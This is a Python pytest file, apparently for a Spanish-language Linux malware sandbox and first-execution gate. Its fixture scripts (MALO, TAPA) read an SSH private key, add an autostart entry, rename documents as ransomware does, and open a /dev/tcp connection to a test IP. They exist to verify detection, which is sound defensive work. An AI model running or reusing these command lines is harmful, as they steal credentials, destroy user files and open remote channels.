"""Detonación (sandbox real con strace) y decisiones de la puerta de primera ejecución."""
import os
import shutil
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from escudo import detonar, primera_ejecucion as pe  # noqa: E402

BUENO = "#!/bin/sh\necho hola\ndate\n"
MALO = """#!/bin/bash
cat "$HOME/.ssh/id_ed25519" > /dev/null
echo "[Desktop Entry]" > "$HOME/.config/autostart/x.desktop"
for f in "$HOME"/Documentos/*; do mv "$f" "$f.cifrado"; done
printf '#!/bin/sh\\necho carga\\n' > /tmp/carga && chmod +x /tmp/carga && /tmp/carga
exec 3<>/dev/tcp/203.0.113.7/4444 2>/dev/null || true
"""
TAPA = """#!/bin/bash
cat "$HOME/.ssh/id_ed25519" > /dev/null
: > /tmp/muestra/traza.txt 2>/dev/null; rm -f /tmp/muestra/traza.txt 2>/dev/null
"""

needs_tools = pytest.mark.skipif(not (shutil.which("strace") and shutil.which("bwrap")), reason="sin strace/bwrap")


@needs_tools
@pytest.mark.parametrize("src,want", [(BUENO, "limpio"), (MALO, "malicioso"), (TAPA, "malicioso")])
def test_sandbox_detonation(tmp_path, src, want):
    f = tmp_path / "prog.sh"
    f.write_text(src)
    inf = detonar.detonar(str(f), segundos=15, usar_vm=False, base_dir=tmp_path)
    assert inf.veredicto == want, inf.motivos
    if want == "malicioso" and src is MALO:
        joined = " ".join(inf.motivos)
        for k in ("secreto", "arranque", "ransomware", "ejecutó", "minería"):
            assert k in joined
    assert not list(tmp_path.glob("escudo-detonar-*"))          # nada queda en disco


def test_trace_parser_ignores_sandbox_setup():
    traza = ('10 execve("/usr/bin/bwrap", ["bwrap"], 0x0) = 0\n'
             '10 mount("tmpfs", "/tmp", "tmpfs", 0, NULL) = 0\n'
             '11 execve("/tmp/muestra/p", ["p"], 0x0) = 0\n'
             '11 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1\n')
    inf = detonar.analizar_traza(traza, muestra="/tmp/muestra/p")
    assert inf.veredicto == "limpio" and inf.conexiones == ["93.184.216.34:443"]


def test_gate_decisions(tmp_path):
    allow = {"a" * 64: {"veredicto": "limpio"}, "b" * 64: {"veredicto": "malicioso"},
             "c" * 64: {"veredicto": "sospechoso", "permitido_por_usuario": 1}}
    assert pe.decide("/home/ana/proyecto/build/app", False, None, allow) == "permitir"
    assert pe.decide("/home/ana/Descargas/x", True, "a" * 64, allow) == "permitir"
    assert pe.decide("/home/ana/Descargas/x", True, "b" * 64, allow) == "denegar"
    assert pe.decide("/home/ana/Descargas/x", True, "c" * 64, allow) == "permitir"
    assert pe.decide("/home/ana/Descargas/x", True, "d" * 64, allow) == "analizar"
    assert pe.is_external("/home/ana/Descargas/juego.AppImage")
    assert pe.is_external("/run/media/ana/USB/setup")
    import tempfile
    d = Path(tempfile.mkdtemp(dir=os.path.expanduser("~")))      # fuera de /tmp (que cuenta como «de fuera»)
    own = d / "compilado"
    own.write_text("x")
    assert not pe.is_external(str(own))
    try:
        os.setxattr(own, "user.xdg.origin.url", b"https://example.com/x")
        assert pe.is_external(str(own))                            # marca de descarga del navegador
    except OSError:
        pass                                                       # sistema de archivos sin xattr de usuario
    shutil.rmtree(d)


def test_gate_analyzes_and_learns(tmp_path, monkeypatch):
    monkeypatch.setattr(detonar, "ALLOWLIST", tmp_path / "permitidos.json")
    alerts = []
    g = pe.Gate(alert=alerts.append)
    f = tmp_path / "prog"
    f.write_text("x")
    fake = detonar.Informe(veredicto="limpio", entorno="sandbox", sha256=detonar.sha256_file(str(f)))
    monkeypatch.setattr(detonar, "detonar", lambda *a, **k: fake)
    g.analyze(str(f), fake.sha256, 1000, 1000)
    assert g.allow[fake.sha256]["veredicto"] == "limpio" and "Ya puedes abrirlo" in alerts[-1].action
    assert pe.decide("/tmp/prog", True, fake.sha256, g.allow) == "permitir"


def test_sample_runs_as_user_in_its_own_unit_under_systemd(monkeypatch):
    monkeypatch.setattr(detonar.shutil, "which", lambda n: "/usr/bin/" + n)
    monkeypatch.setenv("INVOCATION_ID", "abc")
    cmd = detonar.como_usuario(["strace", "x"], 1000, 1000, 50)
    assert cmd[0] == "systemd-run" and "--uid=1000" in cmd and "--wait" in cmd and cmd[-2:] == ["strace", "x"]
    assert "MemoryDenyWriteExecute" not in " ".join(cmd)          # no hereda la restricción del servicio
    monkeypatch.delenv("INVOCATION_ID")
    assert detonar.como_usuario(["x"], 1000, 1000, 50)[:2] == ["setpriv", "--reuid=1000"]


def test_sandbox_failure_never_yields_clean():
    ok = '776   execve("/tmp/muestra/x.sh", ["/tmp/muestra/x.sh"], 0x7f /* 5 vars */) = 0\n'
    fallo = ('799   mount("proc", "/newroot/proc", "proc", MS_NOSUID, NULL) = -1 EPERM (Operation not permitted)\n'
             '776   execve("/usr/bin/bwrap", ["/usr/bin/bwrap", "/tmp/muestra/x.sh"], 0x7f) = 0\n')
    assert detonar.se_ejecuto(ok, "/tmp/muestra/x.sh")
    assert not detonar.se_ejecuto(fallo, "/tmp/muestra/x.sh")        # bwrap sí, la muestra no
    assert not detonar.se_ejecuto('776 execve("/tmp/muestra/x.sh", [...]) = -1 EACCES\n', "/tmp/muestra/x.sh")


def test_fileless_exec_and_root_attempts_are_flagged():
    t = ('10 execve("/tmp/muestra/x", ["x"], 0x1) = 0\n'
         '10 memfd_create("a", MFD_CLOEXEC) = 3\n'
         '10 execve("/proc/self/fd/3", ["a"], 0x1) = 0\n'
         '10 setuid(0) = -1 EPERM (Operation not permitted)\n')
    inf = detonar.analizar_traza(t, muestra="/tmp/muestra/x")
    assert inf.veredicto == "malicioso" and any("memoria" in m for m in inf.motivos)
    assert any("administrador" in m for m in inf.motivos)
    solo_memfd = '10 execve("/tmp/muestra/x", ["x"], 0x1) = 0\n10 memfd_create("shm", 0) = 3\n'
    assert detonar.analizar_traza(solo_memfd, muestra="/tmp/muestra/x").veredicto == "limpio"   # Electron, etc.


def test_gate_uses_static_engines_before_sandbox(tmp_path, monkeypatch):
    from escudo.scanner import Detection
    monkeypatch.setattr(detonar, "ALLOWLIST", tmp_path / "permitidos.json")
    f = tmp_path / "prog"
    f.write_text("x")
    sha = detonar.sha256_file(str(f))
    usado = []
    monkeypatch.setattr(detonar, "detonar", lambda *a, **k: usado.append(1) or detonar.Informe(sha256=sha))

    class Sc:
        def __init__(self, sev):
            self.sev = sev

        def scan_file(self, p):
            return [Detection(p, "YARA.Linux_Trojan_X", self.sev, "yara")]
    alerts = []
    g = pe.Gate(alert=alerts.append, scanner=Sc("high"))
    inf = g.analyze(str(f), sha, 1000, 1000)
    assert inf.veredicto == "malicioso" and not usado and inf.entorno == "firmas"   # sin esperar al aislamiento
    g2 = pe.Gate(alert=alerts.append, scanner=Sc("medium"))
    inf2 = g2.analyze(str(f), sha, 1000, 1000)
    assert usado and inf2.veredicto == "sospechoso"                  # aislamiento «limpio» + firma media
